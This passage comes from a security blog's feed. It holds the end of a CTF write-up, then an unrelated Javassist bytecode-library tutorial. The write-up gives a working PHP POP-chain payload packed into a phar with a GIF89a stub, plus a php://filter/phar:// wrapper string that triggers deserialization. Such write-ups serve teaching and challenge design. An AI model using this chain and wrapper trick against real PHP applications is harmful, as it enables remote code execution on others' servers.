class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>) &amp;&amp; <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$fileTmpName</span>)) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$fileError</span> === <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileTmpName</span>);</span><br><span class="line">               <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/temp.log&quot;</span>, <span class="string">&quot;koishi like this:&quot;</span> . <span class="variable">$fileContent</span>);</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: sandybrown&#x27;&gt;koishi like this!!!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;badbad, koishi hate!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;badbad, koishi hate!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>所以我们需要进行简单的绕过，最终构造的pop链如下：</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Neepu</span> = <span class="keyword">new</span> <span class="title class_">Neepu</span>();</span><br><span class="line"><span class="variable">$Shruti</span> = <span class="keyword">new</span> <span class="title class_">Shruti</span>();</span><br><span class="line"><span class="variable">$NewYear</span> = <span class="keyword">new</span> <span class="title class_">NewYear</span>();</span><br><span class="line"><span class="variable">$Koishi</span> = <span class="keyword">new</span> <span class="title class_">Koishi</span>();</span><br><span class="line"><span class="variable">$Obsolescent</span> = <span class="keyword">new</span> <span class="title class_">Obsolescent</span>();</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;n = <span class="variable">$Shruti</span>;</span><br><span class="line"><span class="variable">$Shruti</span>-&gt;r = <span class="variable">$NewYear</span>;</span><br><span class="line"><span class="variable">$NewYear</span>-&gt;nYear = <span class="variable">$Koishi</span>;</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;kk = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;ii = <span class="keyword">array</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;ss = <span class="variable">$Obsolescent</span>;</span><br><span class="line"><span class="variable">$Obsolescent</span>-&gt;o = <span class="variable">$Neepu</span>;</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;ne = <span class="variable">$NewYear</span>;</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;nee = <span class="string">&quot;ObSOLEScEnt::nOWay&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;success.phar&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) ? <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>) : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;koishi like this:GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$Neepu</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;koishi.txt&quot;</span>,<span class="string">&quot;hello shruti&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>),<span class="title function_ invoke__">strlen</span>(<span class="string">&quot;koishi like this:&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>,<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure></div>



<p>检查文件类型时需要包含 Ko1sh1 内容，由于filter对于过滤器的处理不严格，当过滤器存在异常内容时只会出现 Warming 提示，而不会终止程序，而mime_content_type也支持伪协议，所以最终我们使用的payload如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/Ko1sh1/resource=phar:///tmp/temp.log/koishi.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240208002213628.png"
                      alt="image-20240208002213628"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>联赛</category>
      </categories>
      <tags>
        <tag>出题</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>javassist 学习记录</title>
    <url>/2024/03/08/javassist%20%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small primary">
    <p>之前看到过一些相关内容，最近稍微学了点基础记录了一下。</p>

  </div>

<h2 id="javassist-简介"><a href="#javassist-简介" class="headerlink" title="javassist 简介"></a>javassist 简介</h2><p>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件。</p>
<p>我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是Javassit。</p>
<p>与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。</p>
<h2 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h2><p>可以把它理解成加强版的<code>Class</code>对象，需要从<code>ClassPool</code>中获得。</p>
<p>获得方法：<code>CtClass cc = cp.get(ClassName)</code>。</p>
<p><strong>AbstractClass.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>InterfaceClass.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InterfaceClass</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show2</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>CtClass_Learn.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Bean.AbstractClass;</span><br><span class="line"><span class="keyword">import</span> Bean.InterfaceClass;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CtClass_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractClass.class));</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(InterfaceClass.class));</span><br><span class="line"><span class="comment">//        // 新建类</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = pool.makeClass(&quot;Ko1sh1&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        // 设置父类为抽象类</span></span><br><span class="line"><span class="comment">//        CtClass superClass = pool.get(AbstractClass.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上两步可直接合成为：</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>,pool.get(AbstractClass.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建抽象 show 方法并添加</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void show()&#123;String name=\&quot;koishi\&quot;;System.out.println(name);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过 CtClass 的方式获取接口并添加方法</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">interfaceCtClass</span> <span class="operator">=</span> pool.makeInterface(InterfaceClass.class.getName());</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">interface_method</span> <span class="operator">=</span> CtNewMethod.abstractMethod(CtClass.voidType, <span class="string">&quot;show2&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>, interfaceCtClass);</span><br><span class="line">        interfaceCtClass.addMethod(interface_method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再为原本的类添加一个接口</span></span><br><span class="line">        ctClass.addInterface(interfaceCtClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接口实现抽象方法的方式与抽象类的函数相同</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void show2() &#123; System.out.println(\&quot;Implemented method\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存class文件</span></span><br><span class="line"><span class="comment">//        String savePath = &quot;src/main/java/class_repository/Bean/class_repository&quot;;</span></span><br><span class="line"><span class="comment">//        ctClass.writeFile(savePath);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成实例化对象</span></span><br><span class="line"><span class="comment">//        ctClass.toClass().newInstance();</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">instance_class</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> instance_class.newInstance();</span><br><span class="line">        ((AbstractClass)instance).show();</span><br><span class="line">        ((InterfaceClass)instance).show2();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类冻结</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctClass.toClass();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (javassist.CannotCompileException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已调用 writeFile(), toClass(), toBytecode() 方法转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解冻</span></span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            method = CtNewMethod.make(<span class="string">&quot;public void show3() &#123; System.out.println(\&quot;HAHA! I&#x27;m fine again\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(method);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                instance = ctClass.toClass().newInstance();</span><br><span class="line">                instance.getClass().getMethod(<span class="string">&quot;show3&quot;</span>).invoke(instance);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (javassist.CannotCompileException ex)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;解冻后，即使可以修改class内容，但是也不能再重新实例化了&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对上面的代码选取部分进行解释：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractClass.class));</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(InterfaceClass.class));</span><br></pre></td></tr></table></figure></div>

<p>创建了 ClassPool 对象，并调用了 insertClassPath 方法。因为通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径（在该测试 java 文件中，可以不写这两行，因为默认加载器能找到）。</p>
<p>insertClassPath 也可以注册一个目录作为类搜索路径。下面的例子将 &#x2F;classes 添加到类搜索路径中</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">pool.insertClassPath(<span class="string">&quot;./classes&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>类搜索路径不但可以是目录，还可以是 URL ：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPath</span> <span class="variable">cp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassPath</span>(<span class="string">&quot;www.javassist.org&quot;</span>, <span class="number">80</span>, <span class="string">&quot;/java/&quot;</span>, <span class="string">&quot;org.javassist.&quot;</span>);</span><br><span class="line">pool.insertClassPath(cp);</span><br></pre></td></tr></table></figure></div>

<p>上述代码将 <code>http://www.javassist.org:80/java/</code> 添加到类搜索路径。并且这个URL只能搜索 <code>org.javassist</code> 包里面的类。例如，为了加载 <code>org.javassist.test.Main</code>，它的类文件会从<code>http://www.javassist.org:80/java/org/javassist/test/Main.class</code> 获取。</p>
<p>随后新建了 Ko1sh1 类，同时设置其父类为 AbstractClass</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>,pool.get(AbstractClass.class.getName()));</span><br></pre></td></tr></table></figure></div>

<p>与下面的代码等效</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置父类为抽象类</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractClass.class.getName());</span><br><span class="line">ctClass.setSuperclass(superClass);</span><br></pre></td></tr></table></figure></div>



<p>javassist 中当 CtClass 对象调用 writeFile(), toClass(), toBytecode() 方法时，会转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改，再次调用会产生报错。对于被冻结的 CtClass 对象，可以使用 defrost() 进行解冻，调用 defrost() 之后，此 CtClass 对象又可以被修改了（可以修改，但是不能再次加载进 JVM 中了，一个类只能被加载一次，比如实例化操作就无法再次进行了）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="comment">// 生成实例化对象</span></span><br><span class="line"><span class="comment">//        ctClass.toClass().newInstance();</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">instance_class</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> instance_class.newInstance();</span><br><span class="line">        ((AbstractClass)instance).show();</span><br><span class="line">        ((InterfaceClass)instance).show2();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类冻结</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctClass.toClass();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (javassist.CannotCompileException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已调用 writeFile(), toClass(), toBytecode() 方法转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解冻</span></span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            method = CtNewMethod.make(<span class="string">&quot;public void show3() &#123; System.out.println(\&quot;HAHA! I&#x27;m fine again\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(method);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                instance = ctClass.toClass().newInstance();</span><br><span class="line">                instance.getClass().getMethod(<span class="string">&quot;show3&quot;</span>).invoke(instance);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (javassist.CannotCompileException ex)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;解冻后，即使可以修改class内容，但是也不能再重新实例化了&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>除此以外，ClassPool.doPruning 属性值为 true 时，在冻结 CtClass 时，会修剪 CtClass 的数据结构。为了减少内存的消耗，修剪操作会丢弃 CtClass 对象中不必要的属性。例如，Code_attribute 结构会被丢弃。修剪过的 CtClass 对象不能再次被解冻。ClassPool.doPruning 的默认值为 false。</p>
<p>也可通过下面的代码驳回裁剪</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cc.stopPruning(true);</span><br></pre></td></tr></table></figure></div>



<h2 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h2><p>ClassPool 是 CtClass 对象的容器。因为编译器在编译引用 CtClass 代表的 Java 类的源代码时，可能会引用 CtClass 对象，所以一旦一个 CtClass 被创建，它就被保存在 ClassPool 中。简单来说，这就是个容器，存放的是<code>CtClass</code>对象。</p>
<p>如果 CtClass 对象的数量变得非常大（这种情况很少发生，因为 Javassist 试图以各种方式减少内存消耗），ClassPool 可能会导致巨大的内存消耗。 为了避免此问题，可以从 ClassPool 中显式删除不必要的 CtClass 对象。 如果对 CtClass 对象调用 detach()，那么该 CtClass 对象将被从 ClassPool 中删除。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> ... ;</span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.detach();</span><br></pre></td></tr></table></figure></div>

<p>在调用 detach() 之后，就不能调用这个 CtClass 对象的任何方法了。但是如果你调用 ClassPool 的 get() 方法，ClassPool 会再次读取这个类文件，创建一个新的 CtClass 对象。</p>
<p>由于 ClassPool.getDefault() 是为了方便而提供的单例工厂方法，它保留了一个<code>ClassPool</code>的单例并重用它。所以创建的新的 ClassPool 替换旧的 ClassPool，并将旧的 ClassPool 丢弃。除该方法以外，还可通过 <code>new ClassPool(true)</code> 构造一个 ClassPool 对象。</p>
<h3 id="级联的-ClassPools"><a href="#级联的-ClassPools" class="headerlink" title="级联的 ClassPools"></a>级联的 ClassPools</h3><p>如果程序正在 Web 应用程序服务器上运行，则可能需要创建多个 ClassPool 实例; 应为每一个 ClassLoader 创建一个 ClassPool 的实例。 程序应该通过 ClassPool 的构造函数，而不是调用 getDefault() 来创建一个 ClassPool 对象。<br> 多个 ClassPool 对象可以像 java.lang.ClassLoader 一样级联。 例如，</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">parent</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">child</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>(parent);</span><br><span class="line">child.insertClassPath(<span class="string">&quot;./classes&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果调用 child.get()，子 ClassPool 首先委托给父 ClassPool。如果父 ClassPool 找不到类文件，那么子 ClassPool 会尝试在 .&#x2F;classes 目录下查找类文件。如果 child.childFirstLookup 设置为 true，那么子类 ClassPool 会在委托给父 ClassPool 之前尝试查找类文件。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">parent</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">child</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>(parent);</span><br><span class="line">child.appendSystemPath();         <span class="comment">// the same class path as the default one.</span></span><br><span class="line">child.childFirstLookup = <span class="literal">true</span>;    <span class="comment">// changes the behavior of the child.</span></span><br></pre></td></tr></table></figure></div>



<h3 id="拷贝一个已经存在的类来定义一个新的类"><a href="#拷贝一个已经存在的类来定义一个新的类" class="headerlink" title="拷贝一个已经存在的类来定义一个新的类"></a>拷贝一个已经存在的类来定义一个新的类</h3><div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这个程序首先获得类 Point 的 CtClass 对象。然后它调用 setName() 将这个 CtClass 对象的名称设置为 Pair。在这个调用之后，这个 CtClass 对象所代表的类的名称 Point 被修改为 Pair。类定义的其他部分不会改变。</p>
<p>因此，如果后续在 ClassPool 对象上再次调用 get(“Point”)，则它不会返回变量 cc 所指的 CtClass 对象。 而是再次读取类文件 Point.class，并为类 Point 构造一个新的 CtClass 对象。 因为与 Point 相关联的 CtClass 对象不再存在。示例：</p>
<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">CtClass cc1 = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);   <span class="comment">// cc1 is identical to cc.</span></span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);</span><br><span class="line">CtClass cc2 = pool.<span class="keyword">get</span>(<span class="string">&quot;Pair&quot;</span>);    <span class="comment">// cc2 is identical to cc.</span></span><br><span class="line">CtClass cc3 = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);   <span class="comment">// cc3 is not identical to cc.</span></span><br></pre></td></tr></table></figure></div>

<p>cc1 和 cc2 指向 CtClass 的同一个实例，而 cc3 不是。 注意，在执行 cc.setName(“Pair”) 之后，cc 和 cc1 引用的 CtClass 对象都表示 Pair 类。</p>
<p>除了上面的内容，还需要注意，一旦一个 CtClass 对象被 writeFile() 或 toBytecode() 转换为一个类文件，Javassist 会拒绝对该 CtClass 对象的进一步修改。因此，在表示 Point 类的 CtClass 对象被转换为类文件之后，不能将 Pair 类定义为 Point 的副本，在 Point 上执行 setName() 将会被拒绝。 以下代码段是错误的：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);    <span class="comment">// wrong since writeFile() has been called.</span></span><br></pre></td></tr></table></figure></div>

<p>为了避免这种限制，应该在 ClassPool 中调用 getAndRename() 方法。 例如：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.writeFile();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc2</span> <span class="operator">=</span> pool.getAndRename(<span class="string">&quot;Point&quot;</span>, <span class="string">&quot;Pair&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果调用 getAndRename()，ClassPool 首先读取 Point.class 来创建一个新的表示 Point 类的 CtClass 对象。 而且，它会在这个 CtClass 被记录到哈希表之前，将 CtClass 对象重命名为 Pair。因此，getAndRename() 可以在表示 Point 类的 CtClass 对象上调用 writeFile() 或 toBytecode() 后执行。</p>
<h2 id="类加载器-Class-Loader"><a href="#类加载器-Class-Loader" class="headerlink" title="类加载器 (Class Loader)"></a>类加载器 (Class Loader)</h2><p>在Java中，多个类加载器可以共存，每个类加载器创建自己的名称空间。不同的类加载器可以加载具有相同类名的不同类文件。加载的两个类被视为不同的类。此功能使我们能够在单个 JVM 上运行多个应用程序，即使这些程序包含具有相同名称的不同的类。</p>
<p>JVM 不允许动态重新加载类。一旦类加载器加载了一个类，它不能在运行时重新加载该类的修改版本。</p>
<p>如果相同的类文件由两个不同的类加载器加载，则 JVM 会创建两个具有相同名称和定义的不同的类。由于两个类不相同，一个类的实例不能被分配给另一个类的变量。两个类之间的转换操作将失败并抛出一个 ClassCastException。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">MyClassLoader</span> <span class="variable">myLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> myLoader.loadClass(<span class="string">&quot;Box&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line"><span class="type">Box</span> <span class="variable">b</span> <span class="operator">=</span> (Box)obj;    <span class="comment">// this always throws ClassCastException.</span></span><br></pre></td></tr></table></figure></div>

<p>上述代码将报错，因为 Box 由默认的 classloader 加载，obj 是通过自定义的 classloader 加载的，强制转换将产生报错</p>
<h3 id="javassist-Loader"><a href="#javassist-Loader" class="headerlink" title="javassist.Loader"></a>javassist.Loader</h3><p>Javassit 提供一个类加载器 javassist.Loader。它使用 javassist.ClassPool 对象来读取类文件。<br> 例如，javassist.Loader 可以用于加载用 Javassist 修改过的类。</p>
<h4 id="类加载前"><a href="#类加载前" class="headerlink" title="类加载前"></a>类加载前</h4><p><strong>FatherBean.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FatherBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FatherBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FatherBean</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>SimpleBean.java</strong></p>
